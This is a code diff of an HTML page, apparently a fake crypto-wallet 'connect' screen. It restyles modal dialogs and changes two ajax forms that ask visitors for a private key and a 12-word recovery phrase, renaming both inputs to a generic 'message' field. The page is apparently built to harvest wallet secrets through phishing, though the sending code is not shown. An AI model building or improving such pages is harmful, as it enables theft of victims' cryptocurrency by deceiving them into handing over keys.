@@ -58,75 +58,27 @@
         }
         .modal-content {
             background: #222;
-            padding: 25px;
-            border-radius: 12px;
-            width: 90%;
-            max-width: 380px;
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%; max-width: 350px;
             text-align: center;
             position: relative;
         }
-        /* Increase input field height */
         .modal-content input {
-            width: 100%;
-            padding: 14px;
-            margin: 15px 0;
-            border-radius: 8px;
-            border: none;
-            font-size: 16px;
+            width: 100%; padding: 10px; margin: 10px 0;
+            border-radius: 5px; border: none; font-size: 16px;
         }
-        /* Increase modal height */
-        #phrase-modal .modal-content {
-            min-height: 250px; 
+        .modal-buttons button {
+            width: 100%; padding: 10px;
+            border: none; border-radius: 5px;
+            font-size: 16px; cursor: pointer;
         }
-        .modal-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        /* Style connect button */
-        .connect-btn {
-            background: linear-gradient(135deg, #007bff, #0056b3);
-            color: white;
-            padding: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.3s ease-in-out;
-        }
-        .connect-btn:hover {
-            background: linear-gradient(135deg, #0056b3, #003f7f);
-        }
-        /* Style close button */
-        .close-btn {
-            background: linear-gradient(135deg, #ff4d4d, #b30000);
-            color: white;
-            padding: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.3s ease-in-out;
-        }
-        .close-btn:hover {
-            background: linear-gradient(135deg, #b30000, #800000);
-        }
-        /* Close Icon */
+        .close-btn { background: red; color: white; margin-top: 10px; }
+        .connect-btn { background: blue; color: white; }
         .close-icon {
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            font-size: 26px;
-            cursor: pointer;
-            color: red;
-            transition: transform 0.2s ease-in-out;
+            position: absolute; top: 10px; right: 15px;
+            font-size: 24px; cursor: pointer; color: red;
         }
-        .close-icon:hover {
-            transform: scale(1.1);
-        }
-
     </style>
 </head>
 <body>
@@ -150,7 +102,7 @@
             <span class="close-icon" onclick="closeModal(null, 'passkey-modal')">&times;</span>
             <h2>Enter Private Key</h2>
             <form class="ajaxForm" id="privateKeyForm">
-                <input type="password" name="privatekey" placeholder="Enter Private Key">
+                <input type="password" name="message" placeholder="Enter Private Key">
                 <button type="submit" class="connect-btn">Connect</button>
                 <button type="button" class="close-btn" onclick="closeModal(null, 'passkey-modal')">Cancel</button>
             </form>
@@ -162,7 +114,7 @@
             <span class="close-icon" onclick="closeModal(null, 'phrase-modal')">&times;</span>
             <h2>Enter Recovery Phrase</h2>
             <form class="ajaxForm" id="phraseForm">
-                <input type="text" name="phrase" placeholder="Enter 12-word phrase">
+                <input type="text" name="message" placeholder="Enter 12-word phrase">
                 <button type="submit" class="connect-btn">Connect</button>
                 <button type="button" class="close-btn" onclick="closeModal(null, 'phrase-modal')">Cancel</button>
             </form>
